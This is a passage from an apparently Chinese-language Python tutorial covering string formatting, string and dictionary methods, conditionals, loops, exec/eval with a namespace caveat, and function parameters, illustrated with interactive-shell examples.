，每个字替换段都用花括号括起，其中可能包含名称，还可能包含有关如何对相应的值进行转换和格式设置的信息&gt;&gt;&gt; &quot;{3} {0} {2} {1} {3} {0}&quot;.format(&quot;be&quot;, &quot;not&quot;, &quot;or&quot;, &quot;to&quot;)&apos;to be or not to be&apos;&gt;&gt;&gt; &quot;{name} is approximately {value}&quot;.format(value=pi,name=&apos;Π&apos;)&apos;Π is approximately 3.141592653589793&apos;&gt;&gt;&gt; &quot;{name} is approximately {value:.7f}&quot;.format(value=pi,name=&apos;Π&apos;)&apos;Π is approximately 3.1415927&apos;&gt;&gt;&gt; &quot;Euler&apos;s constant is roughly {e}.&quot;.format(e=e)&quot;Euler&apos;s constant is roughly 2.718281828459045.&quot;</code></pre><p><strong>(2) 完整设置</strong></p><p><em>对字符串调用方法 format ，并提供要设置其格式的值；每个值都被插入字符串中，以替换用花括号括起的<strong>替换字段</strong></em></p><pre><code>1.  字段名：索引或标识符，指出要设置哪个值的格式并使用结果来替换该字段；除指定值外，还可指定值的特定部分，如列表的元素2. 转换标志：跟在叹号后面的单个字符。当前支持的字符包括 r 表示 repr）、 s（表示 str）和 a（表示 ascii ）；如果指定了转换标志，将不使用对象本身的格式设置机制，而是使用指定的函数将对象转换为字符串，再做进一步的格式设置3. 格式说明符：跟在冒号后面的表达式（这种表达式是使用微型格式指定语言表示的）；格式说明符让我们能够详细地指定最终的格式，包括格式类型（如字符串、浮点数或十六进制数），字段宽度和数的精度，如何显示符号和千位分隔符，以及各种对齐和填充方式</code></pre><p><em>根据指定的宽度打印格式良好的价格列表</em></p><pre><code>width = int(input(&apos;Please enter width: &apos;))price_width = 10item_width = width - price_widthheader_fmt = &apos;{{:{}}}{{:>{}}}&apos;.format(item_width, price_width)fmt  = &apos;{{:{}}}{{:>{}.2f}}&apos;.format(item_width, price_width)print(&apos;=&apos; * width)print(header_fmt.format(&apos;Item&apos;, &apos;Price&apos;))print(&apos;-&apos; * width)print(fmt.format(&apos;Apples&apos;, 0.4))print(fmt.format(&apos;Pears&apos;, 0.5))print(fmt.format(&apos;Cantaloupes&apos;, 1.92))print(fmt.format(&apos;Dried Apricots (16 oz.)&apos;, 8))print(fmt.format(&apos;Prunes (4 lbs.)&apos;, 12))print(&apos;=&apos; * width)</code></pre><h3 id="3-字符串方法"><a href="#3-字符串方法" class="headerlink" title="3. 字符串方法"></a>3. 字符串方法</h3><p><strong><em>string 模块常用常量</em></strong></p><p><img src="http://pguklm607.bkt.clouddn.com/string.png" alt=""></p><p><strong><em>字符串常用方法</em></strong></p><p><strong><em>(1) center：通过在两边添加填充字符（默认为空格）让字符串居中</em></strong></p><pre><code>&gt;&gt;&gt; &quot;Hello python&quot;.center(20)&apos;    Hello python    &apos;&gt;&gt;&gt; &quot;Hello python&quot;.center(20,&apos;!&apos;)&apos;!!!!Hello python!!!!&apos;</code></pre><p><strong><em>(2) find： 在字符串中查找子串。如果找到，就返回子串的第一个字符的索引，否则返回 -1 </em></strong></p><pre><code>&gt;&gt;&gt; &quot;To be or no to be&quot;.find(&apos;to&apos;)12&gt;&gt;&gt; x = &quot;Welcome to python.org&quot;&gt;&gt;&gt; x.find(&apos;python&apos;)11&gt;&gt;&gt; x.find(&apos;python&apos;,11,18)  指定搜索范围的起点和终点11</code></pre><p><strong><em>(3) join：用于合并序列的元素</em></strong></p><pre><code>所合并序列的元素必须都是字符串&gt;&gt;&gt; seq = [&apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;,&apos;5&apos;]&gt;&gt;&gt; sep = &apos;+&apos;&gt;&gt;&gt; sep.join(seq)&apos;1+2+3+4+5&apos;&gt;&gt;&gt; dirs = &apos;&apos;,&apos;usr&apos;,&apos;bin&apos;,&apos;env&apos;&gt;&gt;&gt; &apos;/&apos;.join(dirs)&apos;/usr/bin/env&apos;</code></pre><p><strong><em>(4) lower：返回字符串小写版本</em></strong></p><pre><code>&gt;&gt;&gt; &apos;Welcom To Python.Org&apos;.lower()&apos;welcom to python.org&apos;&gt;&gt;&gt; name = &apos;Frank&apos;&gt;&gt;&gt; names = [&apos;frank&apos;,&apos;tom&apos;,&apos;alice&apos;]&gt;&gt;&gt; if name.lower() in manes: print(&apos;Found it&apos;)found it</code></pre><p><em>title：将字符串转化为词首大写</em></p><pre><code>&gt;&gt;&gt; &apos;welcome to python.org&apos;.title()&apos;Welcome To Python.Org&apos;</code></pre><p><strong><em>(5) replace：指定子串都替换为另一个字符串，并返回替换后的结果</em></strong></p><pre><code>&gt;&gt;&gt; &apos;That is a test&apos;.replace(&apos;at&apos;,&apos;is&apos;)&apos;This is a test&apos;&gt;&gt;&gt; &apos;That is a test&apos;.replace(&apos;That&apos;,&apos;This&apos;)&apos;This is a test&apos;</code></pre><p><strong><em>(6) split：与join相反，将字符串拆分为序列</em></strong></p><pre><code>&gt;&gt;&gt; &apos;/usr/bin/local/src&apos;.split(&apos;/&apos;)[&apos;&apos;, &apos;usr&apos;, &apos;bin&apos;, &apos;local&apos;, &apos;src&apos;]&gt;&gt;&gt; &apos;1+2+3+4+5&apos;.split(&apos;+&apos;)[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;]</code></pre><p><strong><em>(7) strip：将字符串开头和末尾的空白删除，并返回删除后的结果</em></strong></p><pre><code>&gt;&gt;&gt; &apos;  welcome to python.org   &apos;.strip()&apos;welcome to python.org&apos;&gt;&gt;&gt; &apos; !**!Welcome to python.org !!**&apos;.strip(&apos; !*&apos;)&apos;Welcome to python.org&apos;</code></pre><p><strong><em>(8) translate：进行单字符替换，可同时替换多个字符</em></strong></p><p><em>要创建转换表，可对字符串类型 str 调用方法 <code>maketrans</code> ，这个方法接受两个参数：两个长度相同的字符串，它们指定要将第一个字符串中的每个字符都替换为第二个字符串中的相应字符</em></p><pre><code>&gt;&gt;&gt; table = str.maketrans(&apos;cs&apos;,&apos;kz&apos;)&gt;&gt;&gt; &apos;this is a test&apos;.translate(table)&apos;thiz iz a tezt&apos;</code></pre><p><strong><em>(9) 字符条件判断</em></strong></p><p><em>很多字符串方法都以 is 打头，它们判断字符串是否具有特定的性质；如果字符串具备特定的性质，这些方法就返回True ，否则返回 False</em></p><p><img src="http://pguklm607.bkt.clouddn.com/isstring.png" alt=""></p><hr><h2 id="0x04-字典及用法"><a href="#0x04-字典及用法" class="headerlink" title="0x04 字典及用法"></a>0x04 字典及用法</h2><p><em>通过名称来访问其各个值的数据结构，这种数据结构称为映射（mapping）；字典是Python中唯一的内置映射类型，其中的值不按顺序排列，而是存储在键下，键可能是数、字符串或元组</em></p><h3 id="1-字典用途"><a href="#1-字典用途" class="headerlink" title="1. 字典用途"></a>1. 字典用途</h3><p><em>字典旨在能够轻松地找到特定的单词（键），以获悉其定义（值）</em></p><pre><code>1. 表示棋盘的状态，其中每个键都是由坐标组成的元组2. 存储文件修改时间，其中的键为文件名3. 数字电话/地址簿</code></pre><p><em>用法实例比较</em></p><pre><code>使用列表，查询指定人物电话号码&gt;&gt;&gt; names = [&apos;Tom&apos;,&apos;Alice&apos;,&apos;Bob&apos;,&apos;Frank&apos;]&gt;&gt;&gt; numbers = [&apos;1001&apos;,&apos;2002&apos;,&apos;3003&apos;,&apos;4004&apos;]&gt;&gt;&gt; numbers[names.index(&apos;Bob&apos;)]&apos;3003&apos;使用字典，通过键查询对应号码&gt;&gt;&gt; phonebook = {&apos;Tom&apos;:&apos;1001&apos;,&apos;Alice&apos;:&apos;2002&apos;,&apos;Bob&apos;:&apos;3003&apos;,&apos;Frank&apos;:&apos;4004&apos;}&gt;&gt;&gt; phonebook[&apos;Bob&apos;]&apos;3003&apos;</code></pre><h3 id="2-创建使用字典"><a href="#2-创建使用字典" class="headerlink" title="2. 创建使用字典"></a>2. 创建使用字典</h3><pre><code>phonebook = {&apos;Tom&apos;:&apos;1001&apos;,&apos;Alice&apos;:&apos;2002&apos;,&apos;Bob&apos;:&apos;3003&apos;,&apos;Frank&apos;:&apos;4004&apos;}</code></pre><p><em>字典由键及其相应的值组成，这种<strong>键-值对</strong>称为项（item）。在前面的示例中，键为名字，而值为电话号码。每个键与其值之间都用<strong>冒号（ : ）</strong>分隔，项之间用逗号分隔，而整个字典放在花括号内</em></p><p><strong><em>(1) 函数 dict</em></strong></p><p><em>可使用函数 dict从其他映射（如其他字典）或键-值对序列创建字典</em></p><pre><code>&gt;&gt;&gt; items = [(&apos;name&apos;,&apos;Frank&apos;),(&apos;number&apos;,30)]&gt;&gt;&gt; d = dict(items)&gt;&gt;&gt; d{&apos;name&apos;: &apos;Frank&apos;, &apos;number&apos;: 30}&gt;&gt;&gt; d[&apos;name&apos;]&apos;Frank&apos;</code></pre><p><em>使用关键字实参来调用这个函数</em></p><pre><code>&gt;&gt;&gt; d = dict(name = &apos;Tom&apos;,number = 18)&gt;&gt;&gt; d{&apos;name&apos;: &apos;Tom&apos;, &apos;number&apos;: 18}</code></pre><p><strong><em>(2) 基本操作</em></strong></p><p><em>字典的基本行为在很多方面都类似于序列</em></p><pre><code>1. len(d) 返回字典 d 包含的项（键-值对）数2. d[k] 返回与键 k 相关联的值3. d[k] = v 将值 v 关联到键 k4. del d[k] 删除键为 k 的项5. k in d 检查字典 d 是否包含键为 k 的项&gt;&gt;&gt; phonebook = {&apos;Tom&apos;:&apos;1001&apos;,&apos;Alice&apos;:&apos;2002&apos;,&apos;Bob&apos;:&apos;3003&apos;,&apos;Frank&apos;:&apos;4004&apos;}&gt;&gt;&gt; len(phonebook)4&gt;&gt;&gt; phonebook[&apos;Tom&apos;]&apos;1001&apos;&gt;&gt;&gt; phonebook[&apos;Tom&apos;] = &apos;10010&apos;&gt;&gt;&gt; phonebook[&apos;Tom&apos;]&apos;10010&apos;&gt;&gt;&gt; phonebook{&apos;Tom&apos;: &apos;10010&apos;, &apos;Alice&apos;: &apos;2002&apos;, &apos;Bob&apos;: &apos;3003&apos;, &apos;Frank&apos;: &apos;4004&apos;}&gt;&gt;&gt; del phonebook[&apos;Bob&apos;]&gt;&gt;&gt; phonebook{&apos;Tom&apos;: &apos;10010&apos;, &apos;Alice&apos;: &apos;2002&apos;, &apos;Frank&apos;: &apos;4004&apos;}&gt;&gt;&gt; &apos;Bob&apos; in phonebookFalse</code></pre><p><em>字典与列表的不同之处</em></p><pre><code>1. 键的类型：字典中的键可以是整数，但并非必须是整数。字典中的键可以是任何不可变的类型，如浮点数（实数）、字符串或元组2. 自动添加：即便是字典中原本没有的键，也可以给它赋值，这将在字典中创建一个新项。然而，如果不使用 append 或其他类似的方法，就不能给列表中没有的元素赋值3. 成员资格：表达式k in d（其中 d 是一个字典）查找的是键而不是值，而表达式 v in l （其中 l 是一个列表）查找的是值而不是索引结果字典包含指定的键，检查相应的值就很容易&gt;&gt;&gt; List = []&gt;&gt;&gt; List[2] = &apos;list&apos;IndexError: list assignment index out of range&gt;&gt;&gt; List[:] = [None]*4&gt;&gt;&gt; List[None, None, None, None]&gt;&gt;&gt; List[2] = &apos;list&apos;&gt;&gt;&gt; List[None, None, &apos;list&apos;, None]&gt;&gt;&gt; Dict = {}&gt;&gt;&gt; Dict[2] = &apos;dict&apos;&gt;&gt;&gt; Dict{2: &apos;dict&apos;}</code></pre><p><em>使用字典创建电话簿数据库</em></p><pre><code># 将姓名用作键的字典，每个人用一个字典表示# 字典包含键&apos;phone&apos;和&apos;addr&apos;,分别与电话号码与地址关联people = {&apos;Tom&apos;:{&apos;phone&apos;:&apos;10001&apos;,&apos;addr&apos;:&apos;Beijing&apos;},&apos;Frank&apos;:{&apos;phone&apos;:&apos;20002&apos;,&apos;addr&apos;:&apos;Shanghai&apos;},&apos;Alice&apos;:{&apos;phone&apos;:&apos;30003&apos;,&apos;addr&apos;:&apos;Shenzhen&apos;}}# 电话号码与地址的描述性标签，方便打印输出labels = {&apos;phone&apos;:&apos;phone number&apos;,&apos;addr&apos;:&apos;address&apos;}name = input(&apos;Name: &apos;)# 查询电话号码/地址?request = input(&apos;Phone number(p) or address(a)?&apos;)# 使用正确的键if request == &apos;p&apos;:key = &apos;phone&apos;if request == &apos;a&apos;:key = &apos;addr&apos;# 仅当名字是字典中包含的键是才打印信息if name in people: print(&quot;{}&apos;s {} is {}&quot;.format(name,labels[key],people[name][key]))==================== RESTART: H:/Code/Python/ponebook.py ====================Name: FrankPhone number(p) or address(a)?aFrank&apos;s address is Shanghai</code></pre><p><strong><em>(3) 将字符串格式设置功能用于字典</em></strong></p><p><em>可使用 <code>format_map</code> 来指出将通过一个映射来提供所需的信息；像这样使用字典时，可指定任意数量的转换说明符，条件是所有的字段名都是包含在字典中的键在模板系统中，这种字符串格式设置方式很有用</em></p><pre><code>&gt;&gt;&gt; template = &apos;&apos;&apos;&lt;html&gt;&lt;head&gt;&lt;title&gt;{title}&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;{title}&lt;/h1&gt;&lt;p&gt;{text}&lt;/p&gt;&lt;/body&gt;&apos;&apos;&apos;&gt;&gt;&gt; data = {&apos;title&apos;:&apos;My Home Page&apos;,&apos;text&apos;:&apos;Welcome to my home page!&apos;}&gt;&gt;&gt; print(template.format_map(data))&lt;html&gt;&lt;head&gt;&lt;title&gt;My Home Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;My Home Page&lt;/h1&gt;&lt;p&gt;Welcome to my home page!&lt;/p&gt;&lt;/body&gt;</code></pre><p><strong><em>(4) 字典方法</em></strong></p><p><em>A. clear： 删除所有的字典项，就地执行，因此什么都不返回（或者说返回 None ）</em></p><pre><code>&gt;&gt;&gt; d = {}&gt;&gt;&gt; d[&apos;name&apos;] = &apos;Bob&apos;&gt;&gt;&gt; d[&apos;number&apos;] = &apos;10001&apos;&gt;&gt;&gt; d{&apos;name&apos;: &apos;Bob&apos;, &apos;number&apos;: &apos;10001&apos;}&gt;&gt;&gt; returned_value = d.clear()&gt;&gt;&gt; d{}&gt;&gt;&gt; print(returned_value)None</code></pre><p><em>B. copy：返回一个新字典，其包含的键值对与原来的字典相同</em></p><p><em>浅复制：当替换副本中的值时，原件不受影响；如果修改副本中的值（就地修改而不是替换），原件也将发生变化</em></p><pre><code>&gt;&gt;&gt; x= {&apos;username&apos;:&apos;root&apos;,&apos;permission&apos;:[&apos;x&apos;,&apos;r&apos;,&apos;w&apos;]}&gt;&gt;&gt; y = x.copy()&gt;&gt;&gt; y[&apos;username&apos;] = &apos;user&apos;&gt;&gt;&gt; y[&apos;permission&apos;].remove(&apos;x&apos;)&gt;&gt;&gt; y{&apos;username&apos;: &apos;user&apos;, &apos;permission&apos;: [&apos;r&apos;, &apos;w&apos;]}&gt;&gt;&gt; x{&apos;username&apos;: &apos;root&apos;, &apos;permission&apos;: [&apos;r&apos;, &apos;w&apos;]}</code></pre><p><em>C. formkeys：创建一个新字典，其中包含指定的键，且每个键对应的值都是 None </em></p><pre><code>&gt;&gt;&gt; {}.fromkeys([&apos;name&apos;,&apos;age&apos;]){&apos;name&apos;: None, &apos;age&apos;: None}&gt;&gt;&gt; dict.fromkeys([&apos;name&apos;,&apos;age&apos;],&apos;(unknown)&apos;){&apos;name&apos;: &apos;(unknown)&apos;, &apos;age&apos;: &apos;(unknown)&apos;}</code></pre><p><em>D. get：使用 get 来访问不存在的键时，没有引发异常，而是返回 None</em></p><pre><code>&gt;&gt;&gt; d = {}&gt;&gt;&gt; print(d[&apos;name&apos;])Traceback (most recent call last):  File &quot;&lt;pyshell#79&gt;&quot;, line 1, in &lt;module&gt;    print(d[&apos;name&apos;])KeyError: &apos;name&apos;&gt;&gt;&gt; print(d.get(&apos;name&apos;))None&gt;&gt;&gt; print(d.get(&apos;name&apos;,&apos;not avaliable&apos;))   #可指定默认值not avaliable</code></pre><p><em>E. items： 返回一个包含所有字典项的列表，其中每个元素都为 (key, value) 的形式</em></p><pre><code>&gt;&gt;&gt; d.items()dict_items([(&apos;title&apos;, &apos;Python Web Site&apos;), (&apos;url&apos;, &apos;http://www.python.org&apos;), (&apos;spam&apos;, 0)])&gt;&gt;&gt; d[&apos;spam&apos;] = 1&gt;&gt;&gt; d{&apos;title&apos;: &apos;Python Web Site&apos;, &apos;url&apos;: &apos;http://www.python.org&apos;, &apos;spam&apos;: 1}</code></pre><p><em>F. keys： 返回一个字典视图，其中包含指定字典中的键</em></p><pre><code>&gt;&gt;&gt; d{&apos;title&apos;: &apos;Python Web Site&apos;, &apos;url&apos;: &apos;http://www.python.org&apos;, &apos;spam&apos;: 1}&gt;&gt;&gt; d.keys()dict_keys([&apos;title&apos;, &apos;url&apos;, &apos;spam&apos;])</code></pre><p><em>G. pop：用于获取与指定键相关联的值，并将该键-值对从字典中删除</em></p><pre><code>&gt;&gt;&gt; d = [&apos;x&apos;:&apos;1001&apos;,&apos;y&apos;:&apos;2002&apos;]SyntaxError: invalid syntax&gt;&gt;&gt; d = {&apos;x&apos;:&apos;1001&apos;,&apos;y&apos;:&apos;2002&apos;}&gt;&gt;&gt; d{&apos;x&apos;: &apos;1001&apos;, &apos;y&apos;: &apos;2002&apos;}&gt;&gt;&gt; d.pop(&apos;y&apos;)&apos;2002&apos;&gt;&gt;&gt; d{&apos;x&apos;: &apos;1001&apos;}</code></pre><p><em>H. popitem： 类似于 list.pop ，但 list.pop 弹出列表中的最后一个元素，而 popitem 随机地弹出一个字典项</em></p><pre><code>&gt;&gt;&gt; d = {&apos;url&apos;: &apos;http://www.python.org&apos;, &apos;spam&apos;: 0, &apos;title&apos;: &apos;Python Web Site&apos;}&gt;&gt;&gt; d.popitem()(&apos;title&apos;, &apos;Python Web Site&apos;)&gt;&gt;&gt; d{&apos;url&apos;: &apos;http://www.python.org&apos;, &apos;spam&apos;: 0}</code></pre><p><em>I. setdefault： 类似get ，获取与指定键相关联的值，还在字典不包含指定的键时，在字典中添加指定的键-值对</em></p><pre><code>&gt;&gt;&gt; d = {}&gt;&gt;&gt; d.setdefault(&apos;name&apos;, &apos;N/A&apos;)&apos;N/A&apos;&gt;&gt;&gt; d{&apos;name&apos;: &apos;N/A&apos;}&gt;&gt;&gt; d[&apos;name&apos;] = &apos;Gumby&apos;&gt;&gt;&gt; d.setdefault(&apos;name&apos;, &apos;N/A&apos;)&apos;Gumby&apos;&gt;&gt;&gt; d{&apos;name&apos;: &apos;Gumby&apos;}</code></pre><p><em>J. update： 使用一个字典中的项来更新另一个字典</em></p><pre><code>&gt;&gt;&gt; d = {&apos;title&apos;:&apos;Python Web Site&apos;,&apos;url&apos;:&apos;http://www.python.org&apos;,&apos;changed&apos;:&apos;2018.10.20&apos;}&gt;&gt;&gt; x = {&apos;url&apos;:&apos;www.python.org&apos;}&gt;&gt;&gt; d.update(x)&gt;&gt;&gt; d{&apos;title&apos;: &apos;Python Web Site&apos;, &apos;url&apos;: &apos;www.python.org&apos;, &apos;changed&apos;: &apos;2018.10.20&apos;}</code></pre><p><em>K. values： 返回一个由字典中的值组成的字典视图</em></p><pre><code>&gt;&gt;&gt; d = {}&gt;&gt;&gt; d[1] = 1&gt;&gt;&gt; d[2] = 2&gt;&gt;&gt; d[3] = 2&gt;&gt;&gt; d[4] = 1&gt;&gt;&gt; d.values()dict_values([1, 2, 2, 1])</code></pre><hr><h2 id="0x05-条件及循环"><a href="#0x05-条件及循环" class="headerlink" title="0x05 条件及循环"></a>0x05 条件及循环</h2><h3 id="1-条件语句"><a href="#1-条件语句" class="headerlink" title="1. 条件语句"></a>1. 条件语句</h3><p><strong><em>(1) 布尔值</em></strong></p><p><em>用作布尔表达式，下面的值都将被解释器视为假</em></p><pre><code>False None 0 &quot;&quot; () [] {}</code></pre><p><em>标准值 False 和 None 、各种类型（包括浮点数、复数等）的数值0、空序列（如空字符串、空元组和空列表）以及空映射（如空字典）都被视为假</em></p><p><em>布尔值 True 和 False 属于类型 bool ，而 bool 与 list 、 str 和 tuple 一样，可用来转换其他的值</em></p><pre><code>&gt;&gt;&gt; bool(1)True&gt;&gt;&gt; bool(None)False&gt;&gt;&gt; bool(0)False</code></pre><p><strong><em>(2) if 语句</em></strong></p><p>条件（ if 和冒号之间的表达式）<br>为前面定义的真，就执行后续代码块；如果条件为假，就不执行</p><pre><code>name = input(&apos;What is your name? &apos;)if name.endswith(&apos;Frank&apos;):    print(&apos;Hello, Mr. Frank&apos;)</code></pre><p><strong><em>(3) else 子句</em></strong></p><pre><code>name = input(&apos;What is your name? &apos;)if name.endswith(&apos;Frank&apos;):    print(&apos;Hello, Mr. Frank&apos;)else:    print(&apos;Hello,stranger&apos;)</code></pre><p><strong><em>(3) elif 子句</em></strong></p><p><em>要检查多个条件，可使用 elif；elif 是 else if 的缩写</em></p><pre><code>num = int(input(&apos;Enter a number: &apos;))if num &gt; 0:    print(&apos;The number is positive&apos;)elif num &lt; 0:    print(&apos;The number is negative&apos;)else:    print(&apos;The number is zero&apos;)</code></pre><p><strong><em>(4) 代码块嵌套</em></strong></p><pre><code>name = input(&apos;What is your name? &apos;)if name.endswith(&apos;Gumby&apos;):    if name.startswith(&apos;Mr.&apos;):        print(&apos;Hello, Mr. Gumby&apos;)    elif name.startswith(&apos;Mrs.&apos;):        print(&apos;Hello, Mrs. Gumby&apos;)    else:        print(&apos;Hello, Gumby&apos;)else:    print(&apos;Hello, stranger&apos;)</code></pre><p><strong><em>(5) 条件运算符</em></strong></p><p><img src="http://pguklm607.bkt.clouddn.com/%E6%9D%A1%E4%BB%B6.png" alt=""></p><p><strong><em>(6) 断言</em></strong></p><p><em>程序在错误条件出现时立即崩溃，可在语句中使用关键字 <code>assert</code></em></p><pre><code>&gt;&gt;&gt; age = 10&gt;&gt;&gt; assert 0 &lt; age &lt; 100&gt;&gt;&gt; age = -1&gt;&gt;&gt; assert 0 &lt; age &lt; 100Traceback (most recent call last):  File &quot;&lt;pyshell#174&gt;&quot;, line 1, in &lt;module&gt;    assert 0 &lt; age &lt; 100AssertionError</code></pre><h3 id="2-循环语句"><a href="#2-循环语句" class="headerlink" title="2. 循环语句"></a>2. 循环语句</h3><p><strong><em>(1) while 循环</em></strong></p><p><em>用于在条件为真时反复执行代码块</em></p><pre><code>x = 1sum = 0while x &lt;= 100:    sum = sum+x    x += 1print(sum)</code></pre><p><strong><em>(2) for 循环</em></strong></p><p><em>为序列（或其他可迭代对象）中每个元素执行代码块</em></p><pre><code>words = [&apos;to&apos;,&apos;be&apos;,&apos;or&apos;,&apos;not&apos;,&apos;to&apos;,&apos;be&apos;]for word in words:    print(word)</code></pre><p><em>Python提供了一个创建范围的内置函数<code>range()</code></em></p><pre><code>&gt;&gt;&gt; list(range(0,10))   # 起始位置默认为0[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]&gt;&gt;&gt; for number in range(1,101):  # 打印数字1~100    print(number)&gt;&gt;&gt; for n in range(0,10,2):  # 第三个参数为步长    print(n)</code></pre><p><strong><em>(3) 迭代字典</em></strong></p><p><em>可使用 keys 等字典方法来获取所有的键；可使用 d.values 获取值</em></p><pre><code>d = {&apos;x&apos;:1,&apos;y&apos;:2,&apos;z&apos;:3}for key in d:    print(key,&apos;corresponds to&apos;,d[key])for key, value in d.items():    print(key, &apos;corresponds to&apos;, value)</code></pre><h3 id="3-列表推导"><a href="#3-列表推导" class="headerlink" title="3. 列表推导"></a>3. 列表推导</h3><p><em>列表推导是一种从其他列表创建列表的方式，类似于数学中的集合推导；列表推导的工作原理类似于 for 循环</em></p><pre><code>&gt;&gt;&gt; [x*x for x in range(10) if x%3 ==0][0, 9, 36, 81]&gt;&gt;&gt; squares = {i:&quot;{} squared is {}&quot;.format(i, i**2) for i in range(10)}&gt;&gt;&gt; squares[9]&apos;9 squared is 81&apos;</code></pre><h3 id="4-pass、del与exec"><a href="#4-pass、del与exec" class="headerlink" title="4. pass、del与exec"></a>4. pass、del与exec</h3><p><strong><em>(1) pass 语句</em></strong></p><p><em>什么都不用做，可用作占位符</em></p><p><strong><em>(2) del 语句</em></strong></p><p><em>不仅会删除到对象的引用，还会删除名称本身</em></p><pre><code>&gt;&gt;&gt; x = 1&gt;&gt;&gt; x1&gt;&gt;&gt; del x&gt;&gt;&gt; xNameError: name &apos;x&apos; is not defined</code></pre><p><strong><em>(3)  exec 和 eval</em></strong></p><p><em>使用 exec 和 eval 执行字符串及计算其结果；执行存储在字符串中的Python代码，可能会带来严重的安全隐患；如果将部分内容由用户提供的字符串作为代码执行，将无法控制代码的行为</em></p><p><em>A. exec：函数 exec将字符串作为代码执行</em></p><pre><code>&gt;&gt;&gt; exec(&quot;print(&apos;Hello, python&apos;)&quot;)Hello, python</code></pre><p><em>函数 exec 主要用于动态地创建代码字符串；如果这种字符串来自其他地方（可能是用户），就几乎无法确定它将包含什么内容；因此为了安全起见，要提供一个字典以充当命名空间</em></p><pre><code>&gt;&gt;&gt; from math import sqrt&gt;&gt;&gt; exec(&quot;sqrt = 1&quot;)&gt;&gt;&gt; sqrt(4)Traceback (most recent call last):  File &quot;&lt;pyshell#205&gt;&quot;, line 1, in &lt;module&gt;    sqrt(4)TypeError: &apos;int&apos; object is not callable&gt;&gt;&gt; from math import sqrt&gt;&gt;&gt; scope = {}&gt;&gt;&gt; exec(&apos;sqrt = 1&apos;,scope)  # 提供字典充当命名空间&gt;&gt;&gt; sqrt(4)2.0&gt;&gt;&gt; scope[&apos;sqrt&apos;]1&gt;&gt;&gt; len(scope)2&gt;&gt;&gt; scope.keys() dict_keys([&apos;__builtins__&apos;, &apos;sqrt&apos;])  # 自动在其中添加了包含所有内置函数和值的字典 __builtins__ </code></pre><p><em>B. eval： 计算用字符串表示的表达式并返回结果</em></p><p> <em>exec 执行一系列Python语句，而 eval 计算用字符串表示的Python表达式的值，并返回结果</em></p><pre><code>&gt;&gt;&gt; scope = {}&gt;&gt;&gt; scope[&apos;x&apos;] = 2&gt;&gt;&gt; scope[&apos;y&apos;] = 3&gt;&gt;&gt; eval(&apos;x * y&apos;,scope)6&gt;&gt;&gt; len(scope)3&gt;&gt;&gt; scope.keys()dict_keys([&apos;x&apos;, &apos;y&apos;, &apos;__builtins__&apos;])</code></pre><hr><h2 id="0x06-函数与作用域"><a href="#0x06-函数与作用域" class="headerlink" title="0x06  函数与作用域"></a>0x06  函数与作用域</h2><h3 id="1-自定义函数"><a href="#1-自定义函数" class="headerlink" title="1. 自定义函数"></a>1. 自定义函数</h3><p><em>要判断某个对象是否可调用，可使用内置函数 <code>callable</code></em></p><pre><code>&gt;&gt;&gt; import math&gt;&gt;&gt; x = 1&gt;&gt;&gt; y = math.sqrt&gt;&gt;&gt; callable(x)False&gt;&gt;&gt; callable(y)True</code></pre><p><em>使用 <code>def</code> （表示定义函数）语句</em></p><pre><code>def fibs(num):    result = [0,1]    for i in range(num-2):        result.append(result[-2] + result[-1])    return result&gt;&gt;&gt; fibs(10)[0, 1, 1, 2, 3, 5, 8, 13, 21, 34]</code></pre><p><strong><em>给函数编写文档</em></strong></p><pre><code>def square(x):    &apos;Calculates the square of the number x.&apos;    return x * x&gt;&gt;&gt; square.__doc__&apos;Calculates the square of the number x.&apos;&gt;&gt;&gt; help(sqrt)Help on built-in function sqrt in module math:sqrt(...)    sqrt(x)    Return the square root of x.</code></pre><h3 id="2-函数参数"><a href="#2-函数参数" class="headerlink" title="2. 函数参数"></a>2. 函数参数</h3><p><em>参数存储在局部作用域内，在函数内部给参数赋值对外部没有任何影响</em></p><pre><code>&gt;&gt;&gt; def change(n):    n = &apos;Chinese&apos;&gt;&gt;&gt; name = &apos;English&apos;&gt;&gt;&gt; change(name)&gt;&gt;&gt; name&apos;English&apos;&gt;&gt;&gt; name = &apos;English&apos;&gt;&gt;&gt; n = name    # 与传递参数的效果几乎相同&gt;&gt;&gt; n = &apos;Chinese&apos;  # 在函数内部进行的&gt;&gt;&gt; name&apos;English&apos;</code></pre><p><em>字符串（以及数和元组）是不可变的（immutable），参数为可变的数据结构（如列表），可修改变量关联到的列表</em></p><pre><code>将同一个列表赋给两个变量时，这两个变量将同时指向这个列表&gt;&gt;&gt; def change(n):    n[0] = &apos;Chinese&apos;&gt;&gt;&gt; names = [&apos;English&apos;,&apos;England&apos;]&gt;&gt;&gt; change(names)&gt;&gt;&gt; names[&apos;Chinese&apos;, &apos;England&apos;]&gt;&gt;&gt; names = [&apos;English&apos;,&apos;England&apos;]&gt;&gt;&gt; n = names # 再次假装传递名字作为参数&gt;&gt;&gt; n[0] = &apos;Chinese&apos; # 修改列表&gt;&gt;&gt; names[&apos;Chinese&apos;, &apos;England&apos;]</code></pre><p><em>必须创建列表的副本；对序列执行切片操作时，返回的切片都是副本</em></p><pre><code>创建覆盖整个列表的切片，得到的将是列表的副本&gt;&gt;&gt; names = [&apos;English&apos;,&apos;England&apos;]&gt;&gt;&gt; n = names[:]   # n和names包含两个相等但不同的列表&gt;&gt;&gt; n is namesFalse&gt;&gt;&gt; n == namesTrue&gt;&gt;&gt; names = [&apos;English&apos;,&apos;England&apos;]&gt;&gt;&gt; n = names[:] &gt;&gt;&gt; n[0] = &apos;Chinese&apos;  &gt;&gt;&gt; names[&apos;English&apos;, &apos;England&apos;]</code></pre><p><strong><em>收集参数：使用星号收集余下的位置参数</em></strong></p><pre><code>&gt;&gt;&gt; def print_params(title,*params):    print(title)    print(params)&gt;&gt;&gt; print_params(&apos;params&apos;,1,4,7)params(1, 4, 7)&gt;&gt;&gt; def middle(x,*y,z):    print(x,y,z)&gt;&gt;&gt; middle(1,2,3,4,z=7)  # 使用名称z来指定后续参数1 (2, 3, 4) 7]星号不会收集关键字参数&gt;&gt;&gt; def print_params(title,*params):        print(title)        print(params)&gt;&gt;&gt; print_params(&apos;name&apos;,age=1)TypeError: print_params() got an unexpected keyword argument &apos;age&apos;收集关键字参数，可使用两个星号&gt;&gt;&gt; def print_params_2(**params):    